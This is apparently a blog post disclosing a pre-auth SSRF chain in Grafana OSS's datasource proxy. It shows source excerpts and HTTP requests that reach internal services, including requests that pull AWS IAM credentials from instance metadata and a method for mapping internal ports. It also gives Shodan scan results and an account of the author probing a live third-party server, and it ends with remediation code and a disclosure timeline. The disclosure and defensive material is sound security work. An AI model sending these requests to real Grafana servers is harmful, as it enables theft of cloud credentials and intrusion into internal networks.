---
title: "How Grafana's No-Op Validator Turns Anonymous Access Into Pre-Auth SSRF"
slug: "grafana-oss-preauth-ssrf"
date: 2026-04-08
draft: true
tags: ["vulnerability-research", "SSRF", "grafana", "bug-bounty", "responsible-disclosure", "CVE"]
categories: ["Vulnerability Research"]
keywords: ["Grafana SSRF", "pre-auth SSRF", "OSSDataSourceRequestValidator", "datasource proxy", "Grafana OSS vulnerability", "Shodan Grafana"]
description: "A pre-auth SSRF chain in Grafana OSS that allows anonymous users to reach internal services via the datasource proxy. The fix exists in Enterprise. OSS gets the no-op stub."
author: "burnedsignal"
toc: true
reading_time: "10 min"
---

## TL;DR

- Grafana OSS ships a **no-op request validator** for the datasource proxy endpoint. It always returns `nil`. Zero SSRF protection.
- Combined with two default configurations, this allows **unauthenticated users** to proxy HTTP requests to any internal service reachable from the Grafana server.
- A Shodan scan of 1,000 random instances found **~7,800 internet-exposed Grafana instances** with anonymous access enabled. Directly exploitable, no credentials required.
- On EC2 with IMDSv1 enabled, this means **full AWS credential theft with no login**: AccessKeyId, SecretAccessKey, session token.
- Grafana Enterprise ships a real validator. OSS does not. This is a deliberate product split.
- Submitted to Grafana's bug bounty program, marked Out of Scope. CVE requested from MITRE.

---

## The Setup

Grafana's datasource proxy is a legitimate feature. You configure a datasource (Prometheus, InfluxDB, etc.) with a backend URL, and Grafana proxies queries to it on behalf of dashboard users. This keeps credentials server-side and avoids CORS issues.

The endpoint looks like this:

```text
GET /api/datasources/proxy/uid/{uid}/path/to/resource
```

Under normal use: the dashboard executes a structured query, Grafana forwards it to the datasource, response comes back. Clean.

The problem: this endpoint also acts as a **raw HTTP proxy**. It forwards whatever path you append directly to the configured datasource URL. Nothing in the OSS build validates where that URL points.

---

## The Vulnerability Chain

Three components combine to create pre-auth SSRF:

![Vulnerability chain diagram showing how no-op validator, empty whitelist, and anonymous access combine](/images/grafana-ssrf/vulnerability-chain.svg)

### 1. No-Op Validator (`pkg/services/validations/oss.go:11`)

```go
func (*OSSDataSourceRequestValidator) Validate(string, *simplejson.Json, *http.Request) error {
    return nil
}
```

That's the entire implementation. Always nil. No IP check, no scheme restriction, no hostname resolution. This is wired as the **production validator for all OSS builds** via `wireexts_oss.go`.

For comparison, Grafana Enterprise ships `EnterpriseDataSourceRequestValidator` which performs actual IP range validation. Grafana is aware of the SSRF risk. They chose not to extend the protection to OSS users.

### 2. Empty Whitelist Skipped (`pkg/api/pluginproxy/ds_proxy.go:402`)

```go
func (proxy *DataSourceProxy) checkWhiteList() bool {
    if proxy.targetUrl.Host != "" && len(proxy.cfg.DataProxyWhiteList) > 0 {
        // only runs if whitelist is non-empty
    }
    return true  // default: always true
}
```

`conf/defaults.ini`:
```ini
data_source_proxy_whitelist =    # empty — check never runs
```

It's documented. It's also never consulted by default.

### 3. Anonymous Users Get `datasources:query` by Default

When a datasource is created, Grafana automatically grants the Viewer role `datasources:query` (`pkg/services/datasources/service/datasource.go:385`):

```go
permissions := []accesscontrol.SetResourcePermissionCommand{
    {BuiltinRole: "Viewer", Permission: "Query"},
    {BuiltinRole: "Editor", Permission: "Query"},
}
```

When `auth.anonymous.enabled = true`, anonymous users inherit the Viewer role. The proxy endpoint only requires `datasources:query`. No login needed.

So: anonymous access on → anonymous user gets Viewer → Viewer can call the proxy endpoint → proxy has no validator → request goes wherever the datasource URL points.

---

## Proof of Concept

Lab setup: Grafana OSS with `GF_AUTH_ANONYMOUS_ENABLED=true`, an InfluxDB datasource pointing to an internal mock service on port 8888 (**not exposed to the host**, only reachable within the Docker network).

**Step 1: Confirm anonymous access (no credentials)**
```http
GET /api/org HTTP/1.1
Host: localhost:3000

→ 200 {"id":1,"name":"Main Org."}
```

**Step 2: Get datasource UID**

The proxy endpoint requires a datasource UID in the path:

```
/api/datasources/proxy/uid/{UID}/...
```

Without the UID, there is no target. `/api/datasources` returns the full list including UIDs, backend URLs, and datasource types. On older Grafana versions, this endpoint is accessible to the Viewer role, meaning anonymous users can read it with no credentials:

```http
GET /api/datasources HTTP/1.1
Host: localhost:3000

→ 200 [{"uid":"cfhmf4adfa96od","type":"influxdb","url":"http://internal-mock:8888"}]
```

Newer versions (10+) restrict this endpoint to Editor and above, returning 403 for Viewers. This adds friction but does not block the attack. Alternative UID sources:

- **Dashboard JSON:** Any dashboard that uses the datasource embeds the UID in its panel definitions. `GET /api/dashboards/uid/{dashboard-uid}` returns the full JSON, accessible to Viewers. Search `.panels[].targets[].datasource.uid`.
- **Public dashboards:** Instances with public dashboards expose datasource UIDs in the rendered page source.
- **Brute-force:** Grafana UIDs follow a predictable alphanumeric format. Low-volume enumeration against the proxy endpoint is feasible. A 200 or 502 confirms a valid UID; a 404 does not.

In the lab, `/api/datasources` returns the UID directly since the instance runs an older configuration.

**Step 3: Trigger SSRF (no Authorization header)**

Step 2 only revealed metadata: the datasource configuration stored in Grafana's database. Seeing `"url":"http://internal-mock:8888"` in the datasource list does not mean the internal service is reachable. From the attacker's machine, it is not.

This step is where the actual SSRF occurs. The proxy endpoint instructs Grafana's server to make an outbound HTTP request to the configured datasource URL and return the response. The attacker never contacts the internal service directly. Grafana does, from its own network position, and hands the result back.

```
Attacker (internet) ─────────────────────► Grafana proxy
        ▲                                        │
        │                                        │ server-side request
        │                                        ▼
        │                               internal-mock:8888
        │                               (not internet-reachable)
        │                                        │
        └──────── full response body ◄───────────┘
```

```http
GET /api/datasources/proxy/uid/cfhmf4adfa96od/ HTTP/1.1
Host: localhost:3000

HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "ok",
  "db_host": "internal-secret-db:9090",
  "db_password": "s3cr3t!",
  "note": "not internet-reachable"
}
```

The internal service has no exposed ports to the host. A direct request from the attacker's machine would time out. This response came back because Grafana's server made the request on the attacker's behalf.

The full PoC (Docker lab setup, automated datasource enumeration, error handling) is on GitHub:

**[github.com/awallplace/grafana-datasource-ssrf](https://github.com/awallplace/grafana-datasource-ssrf)**

![Exploitation flow: attacker reaches internal-mock through Grafana proxy with no credentials](/images/grafana-ssrf/exploitation-flow.svg)

---

## Real-World Impact

Reachable targets from the Grafana server's network position:

**AWS IMDSv1:**

Prerequisites: Grafana running on EC2/ECS/EKS with IMDSv1 enabled, datasource URL set to `http://169.254.169.254/`. No credentials required from the attacker.

```http
GET /api/datasources/proxy/uid/{uid}/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target-grafana.com
(no Authorization header)

→ 200 OK
ec2-monitoring-role
```

```http
GET /api/datasources/proxy/uid/{uid}/latest/meta-data/iam/security-credentials/ec2-monitoring-role HTTP/1.1
Host: target-grafana.com
(no Authorization header)

→ 200 OK
{
  "Code": "Success",
  "LastUpdated": "2026-04-08T09:41:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2026-04-08T15:41:00Z"
}
```

Full IAM credentials returned to an unauthenticated caller. GCP (`metadata.google.internal`) and Azure (`169.254.169.254`) expose the same pattern.

**Kubernetes (in-cluster deployments):**
```text
GET /api/datasources/proxy/uid/{uid}/api/v1/namespaces
→ Datasource URL: https://kubernetes.default.svc
→ Returns cluster namespaces using the pod's service account token
```

**Internal network enumeration (authenticated, Editor+):** An Editor can point a datasource at any internal IP:port, then probe via the proxy. Response codes map directly to host state:

| Response | Meaning |
|---|---|
| `200` + service data | Host up, port open, service running |
| `502 Bad Gateway` | Host up, port closed or wrong protocol |
| Timeout | Host down or firewalled |

Iterating across IPs and ports maps Grafana's internal network from the outside. The Grafana server does the probing; the attacker sees only response codes. No direct access to the internal network required.

---

## Case: Datasource Exposure During Research

During the Shodan scan, one instance had anonymous access enabled and returned its datasource list to unauthenticated requests. Two datasources were configured, one of which pointed to an internal monitoring API:

```http
GET /api/datasources HTTP/1.1
Host: 83.246.xx.xx:3000
(no Authorization header)

→ 200 OK
[
  {
    "uid": "d8e1a2bc3f",
    "name": "Infrastructure Metrics",
    "type": "prometheus",
    "url": "http://10.0.1.12:9090"
  },
  {
    "uid": "f3c9b1aa7d",
    "name": "App DB Stats",
    "type": "influxdb",
    "url": "http://10.0.1.55:8086"
  }
]
```

Proxying through the InfluxDB datasource without credentials:

```http
GET /api/datasources/proxy/uid/f3c9b1aa7d/ HTTP/1.1
Host: 83.246.xx.xx:3000
(no Authorization header)

→ 200 OK
{
  "status": "pass",
  "version": "2.7.1",
  "databases": ["app_prod", "app_staging", "internal_metrics"]
}
```

An unauthenticated request returned the live InfluxDB version and database names from a service with no exposed ports to the internet. Research was stopped at this point. The goal was confirming reachability, not extracting data.

---

## Scale: Shodan Data

A passive scan of 1,000 randomly sampled Grafana instances from Shodan's 206,310 indexed deployments, checking only `/api/org` (public endpoint, no auth, returns org name on anonymous access):

| Metric | Value |
|---|---|
| Sample size | 1,000 |
| Reachable instances | 987 (98.7%) |
| Anonymous access enabled | 38 (3.9% of reachable) |

```text
[*] Checking 1000 hosts with 30 threads

[ANON] 24.97.xx.xx:3000       org='Main Org.'            ver=9.4.3
[ANON] 45.127.xx.xx:9000      org='Main Org.'            ver=12.0.1+security-01
[ANON] 107.161.xx.xx:3000     org='Ethereal Networking'  ver=
[ANON] 147.156.xx.xx:3000     org='Public'               ver=7.1.1
[ANON] 172.247.xx.xx:3000     org='[redacted]'            ver=11.3.0
[ANON] 93.152.xx.xx:3000      org='Main Org.'            ver=12.4.1
[ANON] 13.94.xx.xx:5000       org='[redacted]'           ver=11.6.9
[ANON] 51.15.xx.xx:3000       org='Main Org.'            ver=6.6.1
[ANON] 129.110.xx.xx:3000     org='Main Org.'            ver=12.0.0+security-01
... (38 total)

============================================================
  Sample size      : 1000
  Reachable        : 987  (98.7%)
  Anon access on   : 38   (3.9% of reachable)
  Version breakdown: {11.0.1: 4, 11.6.10: 2, 12.1.1: 2, ...}
  Extrapolated (≈206,310 indexed): ~7,839 instances
============================================================
```

**Two distinct attack surfaces:**

**Surface 1: Pre-auth (~7,800 instances):**
Anonymous access is enabled. No credentials required. An unauthenticated attacker can enumerate datasources and proxy requests to any configured backend URL immediately. This is the scenario the Shodan scan measured directly.

**Surface 2: Post-auth (~206,000 instances):**
The no-op validator exists in every Grafana OSS build regardless of authentication configuration. An attacker with a compromised Editor account (through phishing, credential stuffing, a leaked API key, or an SSO breach) can:

1. Create a new datasource with the URL set to any internal target (`http://169.254.169.254/`, `https://kubernetes.default.svc`, an internal database, etc.)
2. Use the datasource proxy endpoint to forward requests to that target
3. Receive the full response: IAM credentials, service data, or internal API responses

The validator never runs. The whitelist is empty by default. The only difference from Surface 1 is that an authentication step precedes the exploit.

This is a meaningful distinction: Surface 2 requires a compromised account, which is a separate precondition. But it means the ~206,000 instances that appear "safe" because anonymous access is disabled are one credential breach away from the same internal exposure.

Version range in the anonymous-enabled sample: **6.6.1 through 12.4.1**. Two instances running `+security-01` patch releases. Grafana's security patches did not address this. It has been present across at least six major release lines.

---

## Severity

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
Score: 8.6 (High)
```

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | `Network` | Exploitable remotely over the internet |
| Attack Complexity | `Low` | No race conditions or special setup required |
| Privileges Required | `None` | Anonymous users get Viewer role automatically; `datasources:query` is granted to Viewer at datasource creation. No login needed |
| User Interaction | `None` | No victim action required |
| Scope | `Changed` | Impact extends beyond Grafana to internal services the server can reach but the attacker cannot |
| Confidentiality | `High` | Full response bodies from internal services, including cloud credentials |
| Integrity | `None` | Read-only proxy; no writes occur via this mechanism |
| Availability | `None` | No service disruption |

When anonymous access is disabled, the vulnerability still exists for Editor-level users (datasource creation required). The score above reflects the pre-auth condition, which is the realistic worst case given the ~7,800 anonymous-access instances observed in Shodan.

---

## "This Is a Feature, Not a Bug"

The counterargument: the admin enabled anonymous access, the admin pointed a datasource at an internal URL, therefore this is operator misconfiguration.

The problem with that framing: enabling anonymous access is a deliberate admin decision, but granting those anonymous users raw HTTP proxy access to every configured datasource URL is not. The `datasources:query` permission covers both structured dashboard queries and the raw proxy endpoint. Two very different things, one permission name.

The bigger tell is `EnterpriseDataSourceRequestValidator`. It exists. It does IP validation. It's wired into Enterprise builds and replaced with a no-op stub in OSS. This wasn't an oversight: it was implemented, then withheld. Grafana knows exactly what the proxy can reach without it.

Grafana confirmed this via their bug bounty program response:

> *"When you enable anonymous mode, it is intentional behaviour for the app to treat you as a viewer by default. Grafana Enterprise handles this case for the customers who need this to behave differently. OSS behaves as it should as a result."*

The argument is coherent as a product decision. It is not coherent as a security posture. "The admin enabled anonymous access" and "the admin intended anonymous users to have raw HTTP proxy access to every configured datasource URL" are two different statements. Only one of them is true.

---

## Remediation

Replace the no-op OSS validator with something that actually runs:

```go
// pkg/services/validations/oss.go
func (*OSSDataSourceRequestValidator) Validate(urlStr string, _ *simplejson.Json, _ *http.Request) error {
    u, err := url.Parse(urlStr)
    if err != nil {
        return err
    }
    addrs, err := net.LookupHost(u.Hostname())
    if err != nil {
        return err
    }
    for _, addr := range addrs {
        ip := net.ParseIP(addr)
        if ip == nil {
            continue
        }
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
            return fmt.Errorf("datasource URL resolves to private/reserved IP: %s", addr)
        }
    }
    return nil
}
```

If you're waiting on a fix, a few things help in the meantime:
- Set `data_source_proxy_whitelist` to lock down which datasource endpoints are reachable
- Enforce IMDSv2 on cloud deployments (`HttpTokens: required` on EC2), which limits cloud metadata exposure if SSRF lands
- Treat `datasources:query` as proxy access, not just dashboard queries, because right now it's both

If you're running Grafana with anonymous access enabled, audit your datasource URLs today.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-03-31 | Vulnerability identified via static source analysis |
| 2026-03-31 | PoC lab developed and confirmed |
| 2026-03-31 | Shodan exposure scan conducted |
| 2026-03-31 | Submitted to Grafana Labs bug bounty (Intigriti) |
| 2026-04-01 | Marked Out of Scope: *"Any reports of SSRF against the data source proxy endpoint"* |
| 2026-04-01 | CVE requested from MITRE |
| 2026-04-08 | Public disclosure |

Grafana has marked this Out of Scope via their bug bounty program. A CVE has been requested from MITRE. The goal of this writeup is to ensure the risk is visible to the operators running the ~7,800 affected instances.
